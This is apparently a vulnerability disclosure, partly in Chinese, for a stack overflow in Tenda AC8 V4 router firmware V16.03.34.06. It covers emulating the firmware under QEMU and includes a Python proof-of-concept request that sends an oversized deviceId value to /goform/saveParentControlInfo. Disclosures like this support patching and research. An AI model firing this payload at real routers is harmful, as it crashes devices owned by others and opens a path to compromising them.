Overview

设备官网：https://www.tenda.com.cn

固件下载网站：https://www.tenda.com.cn/material/show/103518



Affected version

V16.03.34.06

Environmental simulation

need build Network bridge:

apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥


qemu start command：

sudo qemu-mipsel-static -L . ./bin/httpd



Vulnerability details

Tenda AC8V4.0-V16.03.34.06 be discovered to contain a stack overflow via the deviceid parameter in the get_parentControl_list_Info function.



Call chain : saveParentControlInfo -> saveParentControlInfo -> get_parentControl_list_Info

poc

Because saveParentControlInfo calls get_parentControl_list_Info, But there are actually two different stack overflow triggers in saveParentControlInfo and get_parentControl_list_Info

import requests

IP = "192.168.142.100"
url = f"http://{IP}/goform/saveParentControlInfo?"
url += "deviceId=deviceid"+ "R" * 0x300
url += "&enable=enable"
url += "&time=time"
url += "&url_enable=url_enable"
url += "&urls=urls"
url += "&day=day"
url += "&block=block"

response = requests.get(url)
print(response.content)



